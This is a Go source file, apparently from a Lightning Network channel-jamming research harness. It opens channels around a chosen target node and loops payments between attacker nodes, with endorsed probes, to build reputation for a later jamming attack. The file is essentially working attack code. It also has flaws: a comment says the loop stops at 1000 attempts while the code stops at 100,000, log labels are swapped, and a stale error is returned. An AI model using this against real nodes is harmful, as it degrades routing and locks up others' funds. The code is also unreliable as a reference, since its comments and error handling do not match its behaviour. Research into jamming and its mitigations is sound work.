package main

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/lightninglabs/lndclient"
	"github.com/lightningnetwork/lnd/funding"
	"github.com/lightningnetwork/lnd/lnrpc"
	"github.com/lightningnetwork/lnd/lnwire"
	"github.com/lightningnetwork/lnd/routing/route"
)

func runAttack(ctx context.Context, graph *GraphHarness,
	jammer *JammingHarness, targetNode route.Vertex,
	targetPeerAlias string) error {

	// Make sure that we're synced to the graph before starting attack.
	for i := 0; i < 3; i++ {
		if err := graph.WaitForSync(ctx, 0); err != nil {
			return fmt.Errorf("node: %v sync: %w", i, err)
		}
	}

	node, err := graph.LookupByAlias(ctx, targetPeerAlias)
	if err != nil {
		return err
	}

	err = OpenChannels(ctx, graph, targetNode, node.PubKey)
	if err != nil {
		return err
	}

	log.Println("Launching payments to build reputation")
	endorsed, err := BuildReputation(ctx, jammer)
	if err != nil {
		return err
	}

	log.Printf("Reputation building endorsed: %v", endorsed)

	return nil
}

// BuildReputation sends payments between LND0 and LND1, proving to determine
// whether it has sufficient reputation to get endorsed over Target -> Peer
// occasionally.
func BuildReputation(ctx context.Context, j *JammingHarness) (bool,
	error) {

	// First, we'll query some routes so that we don't have to waste time
	// on pathfinding:
	// - To build reputation: LND0 -> LND1 / LND1 -> LND0
	// - To probe endorsement: LND0 -> LND2 (via target/peer)
	amt_msat := lnwire.MilliSatoshi(500_000_000)
	zeroToOne, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(1).NodePubkey,
			AmtMsat:      amt_msat,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return false, fmt.Errorf("0 -> 1: %w", err)
	}

	oneToZero, err := j.LndNodes.GetNode(1).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(0).NodePubkey,
			AmtMsat:      amt_msat,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return false, fmt.Errorf("1 -> 0: %w", err)
	}

	// Just above the dust limit.
	probeAmt := lnwire.MilliSatoshi(400_000)
	zeroToTwo, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(2).NodePubkey,
			AmtMsat:      probeAmt,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return false, fmt.Errorf("0 -> 2: %w", err)
	}

	var (
		i        int
		feesPaid lnwire.MilliSatoshi
	)
	for {
		log.Printf("Sending reputation payment: %v, total fees: %v",
			i, feesPaid)

		// Fire two fast-resolving, successful payments. We don't
		// endorse them because there's only risk (our gain is the same
		// on quick success).
		req0 := JammingPaymentReq{
			AmtMsat:         amt_msat,
			SourceIdx:       0,
			DestIdx:         1,
			EndorseOutgoing: false,
			Settle:          true,
		}
		resp0, err := j.JammingPaymentRoute(ctx, req0, *zeroToOne)
		if err != nil {
			return false, fmt.Errorf("%v - 0: %v", i, err)
		}

		req1 := JammingPaymentReq{
			AmtMsat:         amt_msat,
			SourceIdx:       1,
			DestIdx:         0,
			EndorseOutgoing: false,
			Settle:          true,
		}

		resp1, err := j.JammingPaymentRoute(ctx, req1, *oneToZero)
		if err != nil {
			return false, fmt.Errorf("%v - 1: %v", i, err)
		}

		// Consume both results, we almost always expect these to
		// succeed so we don't bother with much handling here.
		for i := 0; i < 2; i++ {
			select {
			case r0 := <-resp0:
				if r0.Err != nil {
					return false, err
				}

				if r0.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
					log.Printf("%v: 1->0 failed: %v",
						i, r0.SendFailure)
				} else {
					feesPaid += zeroToOne.TotalFeesMsat
				}

			case r1 := <-resp1:
				if r1.Err != nil {
					return false, err
				}

				if r1.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
					log.Printf("%v: 0->1 failed: %v",
						i, r1.SendFailure)
				} else {
					feesPaid += oneToZero.TotalFeesMsat
				}

			case <-ctx.Done():
				return false, ctx.Err()
			}
		}

		// We don't need to probe every time, tradeoff overpayment with
		// speed.
		if i%10 != 0 {
			i++
			continue
		}

		// Next, we send a payment to probe whether we have sufficient
		// reputation to get endorsed by our peer. Don't risk the
		// payment taking too long, so set a short timeout.
		probeReq := JammingPaymentReq{
			AmtMsat:         probeAmt,
			SourceIdx:       0,
			DestIdx:         2,
			EndorseOutgoing: true,
			SettleWait:      time.Second * 15,
			Settle:          false,
		}

		log.Printf("Sending endorsement probe: %v", i)
		resp, err := j.JammingPaymentRoute(ctx, probeReq, *zeroToTwo)
		if err != nil {
			return false, fmt.Errorf("%v - probe: %v", i, err)
		}

		select {
		case r := <-resp:
			if r.Err != nil {
				return false, r.Err
			}

			if r.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
				log.Printf("%v: probe payment failure: %v",
					i, r.SendFailure)
			}

			// If any htlcs get through endorsed consider base
			// reputation to be built.
			for _, htlc := range r.Htlcs {
				if htlc.IncomingEndorsed {
					return true, nil
				}
			}

		case <-ctx.Done():
			return false, ctx.Err()
		}

		// Give up after 1000 attempts - it's possible that our target
		// does not have good reputation with their peer and then we'll
		// never get a successful probe.
		if i == 100_000 {
			return false, nil
		}

		i++
	}
}

// OpenChannels opens a set of channels that can be used to build reputation
// with a target node for use over its channel with the target peer provided.
// This function assumes that the target and its peers are directly connected
// with *one* channel.
//
// Given: Target --- Peer
//
// This function will open channels as follows:
//
//	   LND0
//		|
//
//	   Target --- Peer --- LND2
//
//		|
//	    LND1
func OpenChannels(ctx context.Context, graph *GraphHarness, targetNode,
	targetPeer route.Vertex) error {

	// LND0 -> Target
	chanCap := funding.MaxBtcFundingAmount
	chan1, err := graph.OpenChannel(ctx, OpenChannelReq{
		Source:      0,
		Dest:        targetNode,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return fmt.Errorf("LND-0 -> target: %v", err)
	}

	log.Printf("Opened channel with target node (%s) from LND-0", targetNode)

	// LND-1 -> Target
	chan2, err := graph.OpenChannel(ctx, OpenChannelReq{
		Source:      1,
		Dest:        targetNode,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return fmt.Errorf("LND-1 -> target: %v", err)
	}

	log.Printf("Opened channel with target node (%s) from LND-1", targetNode)

	// LND-2 -> Peer (we don't need any liquidity)
	chan3, err := graph.OpenChannel(ctx, OpenChannelReq{
		Source:      2,
		Dest:        targetPeer,
		CapacitySat: chanCap,
		PushAmt:     chanCap - 10000,
	})
	if err != nil {
		return fmt.Errorf("LND-2 -> target peer: %v", err)
	}
	log.Printf("Opened channel with target peer (%s) from LND-2",
		targetPeer)

	// Wait for channels to reflect in graphs.
	fmt.Println("Waiting for channels to reflect in graphs")
	graph.WaitForChannel(ctx, 1, 0, chan1)
	graph.WaitForChannel(ctx, 2, 0, chan1)

	graph.WaitForChannel(ctx, 0, 1, chan2)
	graph.WaitForChannel(ctx, 2, 1, chan2)

	graph.WaitForChannel(ctx, 0, 2, chan3)
	graph.WaitForChannel(ctx, 1, 2, chan3)

	return nil
}
